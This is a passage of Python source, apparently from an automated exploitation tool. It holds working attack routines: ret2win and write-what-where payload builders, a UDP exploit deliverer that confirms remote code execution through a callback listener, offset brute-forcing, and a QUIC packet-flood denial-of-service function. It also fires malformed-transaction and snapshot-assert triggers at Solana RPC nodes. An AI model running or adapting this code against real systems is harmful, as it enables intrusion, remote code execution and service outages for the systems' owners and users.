        if mode == "peda":
            lines.append("source /usr/share/peda/peda.py")

        lines += [
            "",
            "# ── find offset ─────────────────────────────────────────────",
            "define bs_find_offset",
            "  set $pat_size = " + str(sz),
            "  run <<< $(python3 -c 'from pwn import cyclic; import sys; sys.stdout.buffer.write(cyclic(" + str(sz) + "))')",
            "  info registers rip",
            "  python",
            "from pwn import cyclic_find",
            "v = gdb.parse_and_eval('$rip')",
            "off = cyclic_find(int(v) & 0xffffffff)",
            "print('cyclic_find offset:', off)",
            "  end",
            "end",
            "",
        ]

        if win_addr:
            lines += [
                "# ── win function ─────────────────────────────────────────────",
                "break *" + hex(win_addr),
                "",
            ]

        try:
            elf   = ELF(binary, checksec=False)
            funcs = [n for n, a in elf.symbols.items() if a and not n.startswith("_")][:6]
            lines.append("# breakpoints on interesting functions (uncomment to enable):")
            for fn in funcs:
                lines.append("# break " + fn)
            lines.append("")
        except Exception:
            pass

        lines += [
            "# ── stack helpers ────────────────────────────────────────────",
            "define bs_stack",
            "  x/32gx $rsp",
            "end",
            "define bs_regs",
            "  info registers",
            "end",
            "",
            "define bs_exploit",
            "  python",
            "from pwn import *",
            "context.arch = '" + arch + "'",
            "e   = ELF('" + binary.replace("'", "\'") + "', checksec=False)",
            "rop = ROP(e)",
            "win = e.symbols.get('win', " + (hex(win_addr) if win_addr else "0") + ")",
            "g   = rop.find_gadget(['ret'])",
            "ret_g = g[0] if g else 0",
            "payload = b'A'*" + str(offset) + " + p64(ret_g) + p64(win) if win else b'A'*" + str(offset+8),
            "print('Payload (' + str(len(payload)) + 'B):', payload.hex())",
            "  end",
            "end",
            "",
        ]

        if mode == "pwndbg":
            lines += [
                "# pwndbg tips:",
                "# telescope $rsp 20   — annotated stack view",
                "# checksec            — binary protections",
                "# rop                 — ROP gadget search",
                "# heap                — heap chunk view",
                "# got                 — GOT table",
            ]
        elif mode == "peda":
            lines += [
                "# PEDA tips:",
                "# pattern create 200  — create De Bruijn pattern",
                "# pattern offset EIP  — find offset from pattern",
                "# checksec            — binary protections",
                "# ropgadget           — ROP gadgets",
                "# searchmem /bin/sh   — search memory for string",
            ]
        else:
            lines += [
                "# vanilla GDB tips:",
                "# x/32gx $rsp        — dump stack",
                "# info functions     — list functions",
                "# disas main         — disassemble main",
            ]

        script = '\n'.join(lines) + '\n'
        with open(outfile, "w") as f:
            f.write(script)
        log.info("GDB " + mode + " script → " + outfile)
        log.info("  Run: gdb -x " + outfile)
        return outfile

    def fuzz_bpf(self, rpc_url, num_attempts=10):
        log.info(f"BPF/SVM fuzzing via {rpc_url}…")
        success = 0
        for i in range(num_attempts):
            elf_header = (b"\x7fELF"+b"\x02\x01\x01"+b"\x00"*9
                          +struct.pack("<H",0x0002)+struct.pack("<H",0x00f7)
                          +struct.pack("<I",1)+os.urandom(8*5))
            payload = elf_header + os.urandom(random.randint(64,512))
            path = f"fuzz_bpf_{i:03d}.so"
            Path(path).write_bytes(payload)
            cmd = f"solana program deploy --url {rpc_url} {path} 2>&1"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"  BPF {i}: {out[:120]}")
                if "panic" in out.lower() or "error" in out.lower():
                    log.warning(f"  Interesting at attempt {i}")
                success += 1
            except FileNotFoundError:
                log.error("solana CLI not installed"); return False
            except Exception as e:
                log.debug(f"  BPF {i}: {e}")
        log.info(f"BPF fuzzing done: {success}/{num_attempts}")
        return True

    def exploit_deser(self, rpc_url):
        import base64
        log.info("Solana deserialization exploit…")
        payloads = [os.urandom(200), b"\xff"*200, b"\x00"*200,
                    struct.pack("<QQQ",0xDEADBEEF,0xCAFEBABE,0xBAADF00D)*8]
        for i, raw in enumerate(payloads):
            b64 = base64.b64encode(raw).decode()
            cmd = (f"solana transfer --url {rpc_url} --from /dev/stdin "
                   f"11111111111111111111111111111112 0.000001 "
                   f"--tx-data {b64} --allow-unfunded-recipient 2>&1 || true")
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"Deser {i}: {out[:160]}")
                if "panic" in out.lower(): log.warning(f"Panic on deser payload {i}")
            except Exception as e: log.debug(f"Deser {i}: {e}")
        return True

    def dos_quic(self, num_packets=2000):
        log.info(f"QUIC DoS → {self.host}:{self.port} ({num_packets} pkts)…")
        sent = 0
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)
            addr = (self.host, self.port)
            for _ in range(num_packets):
                pkt = bytearray()
                pkt.append(0xC0 | random.randint(0,3))
                pkt += struct.pack(">I",1)
                pkt.append(8)
                pkt += os.urandom(8)
                pkt.append(0)
                pkt += os.urandom(random.randint(16,1200))
                sock.sendto(bytes(pkt), addr); sent += 1
            sock.close()
            log.info(f"QUIC DoS: {sent} packets sent"); return True
        except Exception as e:
            log.error(f"QUIC DoS: {e}"); return False

    def exploit_snapshot_assert(self, rpc_url):
        log.info("Snapshot assert trigger (Agave #6295)…")
        for slot in (0,1,10,2**32-1,2**64-1):
            cmd = f"solana snapshot --url {rpc_url} --slot {slot} 2>&1 || true"
            try:
                out = subprocess.check_output(cmd, shell=True, timeout=10).decode(errors="ignore")
                log.debug(f"  slot={slot}: {out[:160]}")
                if "assert" in out.lower() or "panic" in out.lower():
                    log.warning(f"  Assert/panic at slot={slot}!")
            except Exception as e: log.debug(f"  slot={slot}: {e}")
        return True

    # ── custom raw payload sender ─────────────────────────────────────────────

    # ── UDP payload helpers ─────────────────────────────────────────────────────

    @staticmethod
    def _build_udp_payload(template: bytes, inject: bytes) -> bytes:
        """
        Replaces {PAYLOAD} in the template with inject.
        If no {PAYLOAD}, uses auto-detection of the fuzzable field (repeated bytes).
        After substitution, recalculates Content-Length if the header exists.
        """
        PLACEHOLDER = b"{PAYLOAD}"
        if PLACEHOLDER in template:
            crafted = template.replace(PLACEHOLDER, inject, 1)
        else:
            # fallback: replace longest run of repeated bytes
            best = None
            for m in re.finditer(rb"(.)\1{15,}", template):
                if best is None or len(m.group(0)) > len(best.group(0)):
                    best = m
            if best:
                inj = inject + bytes([best.group(1)[0]]) * max(0, len(best.group(0)) - len(inject))
                crafted = template[:best.start()] + inj[:len(best.group(0))] + template[best.end():]
            else:
                crafted = template + inject

        # Recalculate Content-Length if the header exists
        sep = b"\r\n\r\n"
        if sep in crafted and b"Content-Length:" in crafted:
            hdr_part, body_part = crafted.split(sep, 1)
            body_len = len(body_part)
            # Replace Content-Length value
            new_hdr = re.sub(
                rb"(Content-Length:[ \t]*)\d+",
                lambda m: m.group(1) + str(body_len).encode(),
                hdr_part,
                flags=re.IGNORECASE,
            )
            crafted = new_hdr + sep + body_part

        return crafted

    # ── coredumpctl RIP extraction (systemd) ─────────────────────────────────────


    def _find_offset_from_core_stack(self, core_path: str, cyclic_size: int) -> int:
        """
        When RIP is inside a library (copy crash), the return address slot on the stack
        already has cyclic bytes written into it. Scan the stack memory in the core dump
        for 8-byte values that are valid cyclic sequences and return the offset.
        """
        try:
            from pwn import cyclic, cyclic_find, context as pctx, Corefile
            import struct

            core = Corefile(core_path)
            pat = cyclic(cyclic_size)

            rsp = getattr(core, "rsp", None) or getattr(core, "sp", None)
            if rsp is None:
                log.debug("  Stack scan: no RSP in core")
                return -1

            # Precompute {4-byte-le-value -> offset} for every position in cyclic(n).
            # This gives O(1) lookup vs O(n) cyclic_find per call, and we can scan
            # the entire stack mapping efficiently.
            lookup = {}
            for _ci in range(cyclic_size - 3):
                _v = struct.unpack_from("<I", pat, _ci)[0]
                if _v not in lookup:
                    lookup[_v] = _ci

            log.debug(f"  Stack scan: RSP={hex(rsp)}, {len(core.mappings)} mappings")

            # Scan ALL mappings in the core, not just the one containing RSP.
            # Reason: multithreaded targets may crash inside memcpy (libc).
            # The thread stack is split across multiple PT_LOAD segments in the core:
            # the "current" mapping that contains RSP is only a few KB of recently
            # touched pages. The vulnerable frame with buf[] is on pages that sit in
            # a DIFFERENT (adjacent, higher-address) mapping in the same thread stack.
            # Restricting to the RSP mapping guarantees we never find the cyclic bytes.
            # Solution: scan every anonymous (no-file) mapping whose address looks like
            # a thread stack (0x7f... range, no execute permission) and collect the
            # highest cyclic offset found anywhere.
            best_off   = -1
            best_addr  = -1
            scanned_kb = 0
            all_hits: dict = {}  # memory addr -> cyclic offset

            for mapping in core.mappings:
                data = mapping.data
                if not data:
                    continue
                base = mapping.start
                # Skip file-backed mappings (libraries, binary) — buf[] is on the stack
                name = getattr(mapping, "name", "") or ""
                if name and name not in ("[stack]", "", "None") and "/" in name:
                    continue
                # Only look at user-space addresses (< 0x800000000000)
                if base >= 0x800000000000:
                    continue
                kb = len(data) // 1024
                scanned_kb += kb

                for i in range(0, len(data) - 7, 4):
                    val32 = struct.unpack_from("<I", data, i)[0]
                    off = lookup.get(val32, -1)
                    if off != -1 and off < cyclic_size:
                        addr = base + i
                        all_hits[addr] = off
                        if off > best_off:
                            best_off  = off
                            best_addr = addr

            log.info(f"  Stack scan: searched {scanned_kb} KB across"
                     f" {len(core.mappings)} mappings")

            if best_off == -1:
                log.info("  Stack scan: no cyclic bytes found in any mapping")
                return -1

            # The scan steps by 4 bytes and returns the LAST 4-byte cyclic match
            # before the appended non-cyclic bytes. The 8-byte return address SLOT
            # starts 4 bytes BEFORE this last match — check for a consecutive pair:
            #   best_addr-4 → cyclic[best_off-4]  and  best_addr → cyclic[best_off]
            # If that preceding hit exists, the slot starts at best_off-4.
            # This corrects the common case where the scan returns 180 but the
            # actual return address slot starts earlier.
            if best_off >= 4 and all_hits.get(best_addr - 4) == best_off - 4:
                slot_start = best_off - 4
                log.info(f"  Stack scan: consecutive 8-byte run found "
                         f"(cyclic[{slot_start}..{best_off+3}]) — "
                         f"ret addr slot starts at offset {slot_start}")
            else:
                slot_start = best_off
                log.info(f"  Stack scan: single 4-byte match — "
                         f"ret addr offset = {slot_start}")

            return slot_start

        except Exception as e:
            log.debug(f"  _find_offset_from_core_stack error: {e}")
            return -1


    def _extract_rip_from_coredumpctl(self, binary: str, pid: int) -> int | None:
        """
        Extract RIP from systemd coredump for the given PID.
        Strategy 1: coredumpctl info <PID> → parse register dump text.
        Strategy 2: coredumpctl dump <PID> → parse ELF core with pwntools.
        Strategy 3: read core file from CWD/tmp directly.
        """
        import shutil as _shutil, tempfile as _tempfile, glob as _gl
        log.info(f"  coredumpctl: waiting for core of PID {pid}…")
        time.sleep(3.0)  # give systemd-coredump more time

        # Strategy 0: read core file from CWD (kernel default location)
        _cwd = os.getcwd()
        _now2 = time.time()
        # PID-specific cores only — a stale generic 'core' from a previous run is WRONG
        _pid_specific = sorted(
            [f for f in (
                _gl.glob(f"{_cwd}/core.{pid}") +
                _gl.glob(f"{_cwd}/core.*{pid}*") +
                _gl.glob(f"/tmp/core.{pid}") +
                _gl.glob(f"/tmp/core.*{pid}*")
            ) if os.path.exists(f) and os.path.getsize(f) > 1000],
            key=os.path.getmtime, reverse=True
        )
        # Generic 'core' only if absolutely fresh (< 5s) and no PID match
        _generic = []
        if not _pid_specific:
            _g = f"{_cwd}/core"
            if (os.path.exists(_g) and os.path.getsize(_g) > 1000 and
                    _now2 - os.path.getmtime(_g) < 5):
                _generic = [_g]
        _core_candidates = _pid_specific + _generic
        log.info(f"  Core file search for PID {pid}: {len(_core_candidates)} candidate(s): "
                 f"{_core_candidates[:3]}")
        for _cp in _core_candidates:
            if os.path.getsize(_cp) < 1000:
                continue
            try:
                from pwn import Corefile
                _core = Corefile(_cp)
                _pc = (getattr(_core, "pc",  None) or
                       getattr(_core, "rip", None) or
                       getattr(_core, "eip", None))
                if _pc:
                    log.info(f"  ✓ Core file RIP={hex(_pc)} (from {_cp})")
                    return int(_pc)
            except Exception as _ce:
                log.info(f"  Core file {_cp}: {_ce}")

        # Strategy 1: coredumpctl info <PID>
        if not _shutil.which("coredumpctl"):
            log.info("  coredumpctl not found — only core files in CWD supported")
            return None
        try:
            out = subprocess.check_output(
                ["coredumpctl", "info", "--no-pager", str(pid)],
                stderr=subprocess.PIPE, timeout=15
            ).decode(errors="replace")
            log.info(f"  coredumpctl info output:\n{out[:600]}")
            for pattern in [
                r"RIP:\s*0x([0-9a-fA-F]+)",
                r"\brip\s+0x([0-9a-fA-F]+)",
                r"RIP=0x([0-9a-fA-F]+)",
                r"rip\s*=\s*0x([0-9a-fA-F]+)",
            ]:
                _m = re.search(pattern, out, re.IGNORECASE | re.MULTILINE)
                if _m:
                    rip = int(_m.group(1), 16)
                    log.info(f"  ✓ coredumpctl info: RIP={hex(rip)}")
                    return rip
            log.info("  coredumpctl info: no RIP pattern matched in output")
        except subprocess.CalledProcessError as e:
            log.info(f"  coredumpctl info failed (rc={e.returncode}): "
                     f"{e.stderr.decode(errors='replace')[:200] if e.stderr else ''}")
        except Exception as e:
            log.info(f"  coredumpctl info error: {e}")

        # Strategy 2: coredumpctl dump → pwntools Corefile
        _core_tmp = None
        try:
            _fd, _core_tmp = _tempfile.mkstemp(suffix=".core", prefix="bsmasher_")
            os.close(_fd)
            _out2 = subprocess.run(
                ["coredumpctl", "dump", "--output", _core_tmp, str(pid)],
                capture_output=True, timeout=20
            )
            log.info(f"  coredumpctl dump rc={_out2.returncode} "
                     f"size={os.path.getsize(_core_tmp)}B")
            if _out2.returncode != 0:
                log.info(f"  coredumpctl dump stderr: "
                         f"{_out2.stderr.decode(errors='replace')[:200]}")
            if os.path.getsize(_core_tmp) > 1000:
                from pwn import Corefile
                _core2 = Corefile(_core_tmp)
                _pc2 = (getattr(_core2, "pc",  None) or
                        getattr(_core2, "rip", None) or
                        getattr(_core2, "eip", None))
                if _pc2:
                    log.info(f"  ✓ coredumpctl dump: RIP={hex(_pc2)}")
                    return int(_pc2)
                else:
                    log.info("  coredumpctl dump: Corefile parsed but no RIP found")
        except Exception as e:
            log.info(f"  coredumpctl dump error: {e}")
        finally:
            if _core_tmp:
                try: os.unlink(_core_tmp)
                except: pass

        log.info(f"  All coredump strategies failed for PID {pid}")
        return None

    # ── brute-force exact offset within bisect range ──────────────────────────────

    def _brute_offset_udp(self, payload_template: bytes, binary: str,
                           binary_args: list, host: str, port: int,
                           lo: int, hi: int, step: int,
                           pie_base: int, use_placeholder: bool,
                           inj_start: int, inj_len: int, inj_byte: int) -> int | None:
        """
        Brute-force the exact RIP offset within [lo, hi] by sending a ret2win
        payload for every candidate offset and checking if the process survives
        (RCE) vs crashes differently.

        Returns the confirmed offset, or None if not found.
        """
        try:
            from pwn import ELF as _BELf, ROP as _BROP, p64 as _bp64, context as _bctx
            _elf  = _BELf(binary, checksec=False)
            _WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
                       "easy", "print_flag", "cat_flag"]
            _win_rel = next(
                (a for n, a in _elf.symbols.items()
                 if a and any(kw == n.lower() or n.lower().startswith(kw)
                              for kw in _WIN_KW)),
                0
            )
            if not _win_rel:
                log.warning("  Brute offset: no win() candidate found in binary")
                return None
            _win_abs = pie_base + _win_rel
            # ret gadget for stack alignment
            try:
                _rop = _BROP(_elf)
                _ret_g = _rop.find_gadget(["ret"])
                _ret_abs = (_ret_g[0] + pie_base) if _ret_g else 0
            except Exception:
                _ret_abs = 0
            log.info(f"  Brute offset: testing range [{lo}–{hi}] step={step} "
                     f"win={hex(_win_abs)}")
        except Exception as e:
            log.warning(f"  Brute offset setup failed: {e}")
            return None

        _word = 8 if _bctx.arch == "amd64" else 4
        for _off in range(lo, hi + 1, step):
            # Build exploit bytes: padding to offset, then win address
            # CRITICAL: do NOT pad beyond offset+chain — extra bytes cause the
            # copy function itself to crash before reaching the return address.
            # The stack overflow is in a bounded strcpy/memcpy: we need exactly
            # enough bytes to reach RIP, nothing more.
            if _bctx.arch == "amd64":
                _chain = (_bp64(_ret_abs) if _ret_abs else b"") + _bp64(_win_abs)
            else:
                from pwn import p32 as _bp32
                _chain = _bp32(_win_abs)
            _exploit = b"A" * _off + _chain
            # No padding beyond chain — keep total at exactly offset+chain_size

            if use_placeholder:
                _crafted = self._build_udp_payload(payload_template, _exploit)
            else:
                _inj = _exploit
                if len(_inj) < inj_len:
                    _inj = _inj + bytes([inj_byte]) * (inj_len - len(_inj))
                else:
                    _inj = _inj[:inj_len]
                _crafted = (payload_template[:inj_start]
                            + _inj
                            + payload_template[inj_start + inj_len:])

            try:
                _p = subprocess.Popen(
                    [binary] + binary_args,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                self._wait_for_udp_port(host, port, timeout=5.0)

                # Open a small TCP listener to catch shellcode/win callback
                _lsock = None
                _lport = 16666  # internal brute-force listener
                try:
                    _lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    _lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    _lsock.bind(("127.0.0.1", _lport))
                    _lsock.listen(1)
                    _lsock.settimeout(3.0)
                except Exception:
                    _lsock = None

                _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                _s.settimeout(2.0)
                _s.sendto(_crafted, (host, port))
                _s.close()

                # Wait for RCE callback
                _rce = False
                if _lsock:
                    try:
                        _conn, _ = _lsock.accept()
                        _rce = True
                        _conn.close()
                    except socket.timeout:
                        pass
                    finally:
                        _lsock.close()

                time.sleep(2.0)
                _rc = _p.poll()

                if _rce:
                    log.info(f"  ✓ Brute offset={_off}: RCE CONFIRMED — "
                             f"win callback received (win={hex(_win_abs)})")
                    try: _p.kill(); _p.wait(timeout=2)
                    except: pass
                    return _off
                elif _rc is None:
                    log.debug(f"  Brute offset={_off}: process alive, no RCE callback — "
                              f"win may have run but not connected back")
                    # Still record as candidate — win function might not connect back
                    try: _p.kill(); _p.wait(timeout=2)
                    except: pass
                    return _off
                elif _rc == 0:
                    log.debug(f"  Brute offset={_off}: clean exit (rc=0)")
                else:
                    log.debug(f"  Brute offset={_off}: crash rc={_rc} — wrong offset")
                try: _p.kill()
                except: pass
            except Exception as _be:
                log.debug(f"  Brute offset={_off}: {_be}")

        log.warning(f"  Brute offset: no confirmed RIP control in [{lo}–{hi}]")
        log.warning(f"  This vulnerability is a heap pointer corruption, not a direct")
        log.warning(f"  return address overwrite. Manual heap analysis required.")
        log.warning(f"  Run: coredumpctl debug $(coredumpctl list | tail -1 | awk '{{print $2}}')")
        return None

    # ── automated GDB crash analysis ────────────────────────────────────────────

    def _auto_gdb_crash_analysis(self, binary: str, binary_args: list,
                                  crash_payload: bytes,
                                  host: str, port: int,
                                  startup_wait: float = 3.0) -> str:
        """
        Spawns the binary under GDB, sends the crash payload via UDP,
        and captures bt/registers/rsp output automatically.
        Returns the GDB output as a string, or empty string on failure.
        """
        import shutil, tempfile
        if not shutil.which("gdb"):
            log.warning("  GDB not found — install: apt install gdb")
            return ""

        # Build GDB batch script robust for multithreaded services.
        # Target may crash in a worker thread — we need:
        #   set follow-fork-mode child + thread apply all bt
        _ba_str = " ".join(binary_args)
        gdb_script = (
            "set pagination off\n"
            "set confirm off\n"
            "set print thread-events off\n"
            "set non-stop off\n"
            # Catch all crash signals
            # nopass = intercept signal BEFORE the program's own handler runs
            # This lets us see the real crash thread/RIP before abort() is called
            "handle SIGSEGV stop print nopass\n"
            "handle SIGABRT stop print nopass\n"
            "handle SIGBUS  stop print nopass\n"
            "handle SIGILL  stop print nopass\n"
            "define hook-stop\n"
            "  echo ===CRASH_START===\n\n"
            "  thread apply all bt\n"
            "  info registers\n"
            "  echo ===STACK===\n\n"
            "  x/32gx $rsp\n"
            "  echo ===RIP===\n\n"
            "  p/x $rip\n"
            "  echo ===CRASH_END===\n\n"
            "  quit\n"
            "end\n"
            f"file {binary}\n"
            f"run {_ba_str}\n"
        )

        script_fd, script_path = tempfile.mkstemp(suffix=".gdb")
        try:
            import os as _os
            _os.write(script_fd, gdb_script.encode())
            _os.close(script_fd)

            # Launch GDB non-interactively
            gdb_proc = subprocess.Popen(
                ["gdb", "--batch", "-x", script_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
            )

            # Wait for the target to start inside GDB (needs longer than bare process)
            time.sleep(startup_wait + 2.0)

            # Send the crash payload — retry up to 3 times if port not ready yet
            _sent = False
            for _retry in range(3):
                try:
                    _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    _s.settimeout(2.0)
                    _s.sendto(crash_payload, (host, port))
                    try: _s.recvfrom(1024)
                    except: pass
                    _s.close()
                    _sent = True
                    break
                except Exception as _e:
                    log.debug(f"  GDB crash send attempt {_retry+1}: {_e}")
                    time.sleep(1.0)

            if not _sent:
                log.warning("  GDB: could not send crash payload — port not ready")

            # Collect output — wait up to 15s for crash + bt
            try:
                out, _ = gdb_proc.communicate(timeout=15)
                output = out.decode(errors="replace")
            except subprocess.TimeoutExpired:
                gdb_proc.kill()
                out, _ = gdb_proc.communicate()
                output = out.decode(errors="replace")

            return output

        except Exception as e:
            log.debug(f"  _auto_gdb_crash_analysis: {e}")
            return ""
        finally:
            try: _os.unlink(script_path)
            except: pass
            try: _os.unlink(out_path)
            except: pass

    # ── write-what-where / ptr-overwrite exploit builder ─────────────────────────────

    def build_ptr_overwrite_exploit(self,
                                     payload_template: bytes,
                                     ptr_offset: int,
                                     write_addr: int,
                                     write_data: bytes,
                                     min_crash_size: int = 0) -> bytes:
        """
        Build a write-what-where exploit payload for ptr-overwrite vulnerabilities.

        When the overflow corrupts a pointer field (not a return address), the
        following memcpy/strcpy uses that pointer as destination. This lets us
        write arbitrary data to any address.

        Layout:
          [ptr_offset bytes of filler]     <- fill buffer up to the pointer field
          [8 bytes: write_addr as LE u64]  <- overwrite the pointer with our target
          [write_data]                     <- data the binary will copy to write_addr
          [padding to min_crash_size]      <- ensure buffer overflow actually triggers

        The caller is responsible for:
          - write_addr: address to write to (e.g. GOT entry)
          - write_data: bytes to write there (e.g. system() address)

        Uses {PAYLOAD} placeholder in template if present, otherwise replaces
        the longest run of repeated bytes.
        """
        import struct
        ptr_bytes  = struct.pack("<Q", write_addr)
        inject     = b"A" * ptr_offset + ptr_bytes + write_data
        if min_crash_size and len(inject) < min_crash_size:
            inject = inject + b"\x00" * (min_crash_size - len(inject))
        log.info(f"ptr-overwrite: write {len(write_data)}B to {hex(write_addr)} "
                 f"(ptr_offset={ptr_offset}, total={len(inject)}B)")
        return self._build_udp_payload(payload_template, inject)


    # ── UDP exploit delivery ──────────────────────────────────────────────────────

    def deliver_exploit_udp(self, payload_template: bytes, exploit_payload: bytes,
                             binary: str, binary_args: list,
                             startup_wait: float = 2.5,
                             verify_host: str = "127.0.0.1",
                             verify_port: int = 0,
                             _existing_proc=None) -> bool:
        """
        Builds the exploit payload using _build_udp_payload ({PAYLOAD} supported,
        Content-Length auto-recalculated), sends via UDP,
        and verifies RCE via TCP listener if verify_port > 0.
        If _existing_proc is given, reuses that already-running process instead of spawning.
        """
        crafted = self._build_udp_payload(payload_template, exploit_payload)
        log.info(f"deliver_exploit_udp: {len(crafted)}B (exploit={len(exploit_payload)}B)")

        srv = _existing_proc
        if srv is None and os.path.isfile(binary):
            try:
                srv = subprocess.Popen([binary] + binary_args,
                                       stdin=subprocess.PIPE,
                                       stdout=subprocess.DEVNULL,
                                       stderr=subprocess.DEVNULL)
                log.debug(f"  PID={srv.pid}")
                self._wait_for_udp_port(self.host, self.port, timeout=startup_wait + 3)
            except Exception as e:
                log.error(f"  Could not start binary: {e}")
                return False

        # ── TCP verification listener (receives shellcode callback) ─────────────
        _listener_sock = None
        _rce_confirmed = False
        _rce_output    = b""
        if verify_port > 0:
            try:
                _listener_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                _listener_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                _listener_sock.bind((verify_host, verify_port))
                _listener_sock.listen(1)
                _listener_sock.settimeout(6.0)
                log.info(f"  TCP listener on {verify_host}:{verify_port} waiting for connection…")
            except Exception as e:
                log.warning(f"  Could not open TCP listener: {e}")
                _listener_sock = None

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(4.0)
            sock.sendto(crafted, (self.host, self.port))
            log.info(f"  Exploit sent via UDP ({len(crafted)}B)")
            try:
                resp, _ = sock.recvfrom(4096)
                log.info(f"  Target response: {resp[:80]!r}")
            except socket.timeout:
                log.debug("  No immediate UDP response")
            finally:
                sock.close()

            # Verify RCE via TCP listener
            if _listener_sock:
                try:
                    conn, addr = _listener_sock.accept()
                    _rce_output = conn.recv(4096)
                    conn.close()
                    _rce_confirmed = True
                    log.info(f"  ✓ RCE CONFIRMED — connection from {addr}")
                    log.info(f"  Command output: {_rce_output.decode(errors='replace').strip()}")
                except socket.timeout:
                    log.warning("  No connection to listener — shellcode did not execute")
                finally:
                    _listener_sock.close()

            # Check if process died (secondary indicator)
            if srv:
                time.sleep(1.5)
                if srv.poll() is not None:
                    if _rce_confirmed:
                        log.info("  ✓ Process terminated AND RCE confirmed — exploit successful")
                        return True
                    else:
                        log.warning("  Process crashed but RCE not confirmed — "
                                    "may be crash without RIP control")
                        return False
                else:
                    if _rce_confirmed:
                        log.info("  ✓ RCE confirmed (process alive — shellcode ran in a thread)")
                        return True
                    # Process survived the payload — two possible reasons:
                    # (a) payload too short to reach the return address (offset < ret_addr_offset)
                    # (b) the return address was overwritten but execution continued normally
                    log.debug("  Process still alive — payload did not overwrite return address")
                    return False
            return _rce_confirmed
        except Exception as e:
            log.error(f"  Error: {e}")
            return False
        finally:
            # Only kill the process if WE spawned it (not if caller passed _existing_proc)
            if srv and srv is not _existing_proc:
                try:
                    if srv.poll() is None:
                        srv.terminate(); srv.wait(timeout=3)
                except Exception:
                    pass

    def send_raw_payload(self, payload: bytes, use_udp: bool = False) -> bool:
        """
        Sends a literal payload (no fuzzing) via TCP or UDP.
        """
        transport = "UDP" if use_udp else "TCP"
        log.info(
            f"[send_raw_payload] {len(payload)}B → {self.host}:{self.port} [{transport}]"
        )

        try:
            if use_udp:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3.0)
                sock.sendto(payload, (self.host, self.port))
                log.info(f"  UDP datagram sent ({len(payload)}B)")
                try:
                    resp, addr = sock.recvfrom(4096)
                    log.info(
                        f"  UDP response ({len(resp)}B) from {addr}:\n"
                        f"  {resp[:300]!r}"
                    )
                except socket.timeout:
                    log.warning(
                        "  No UDP response (timeout 3s) — "
                        "normal if the target crashed or is not responding"
                    )
                finally:
                    sock.close()

            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5.0)
                sock.connect((self.host, self.port))
                sock.sendall(payload)
                sock.shutdown(socket.SHUT_WR)
                resp = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        resp += chunk
                except socket.timeout:
                    pass
                finally:
                    sock.close()

                if resp:
                    log.info(
                        f"  TCP response ({len(resp)}B):\n"
                        f"  {resp[:300]!r}"
                    )
                else:
                    log.warning(
                        "  No TCP response — "
                        "possible target crash or connection closed without data"
                    )

            log.info("  Payload sent successfully")
            return True

        except ConnectionRefusedError:
            log.error(
                f"  Connection refused at {self.host}:{self.port} — "
                f"is the target running?"
            )
            return False
        except OSError as e:
            log.error(f"  Socket error: {e}")
            return False
        except Exception as e:
            log.error(f"  Unexpected error: {e}")
            return False
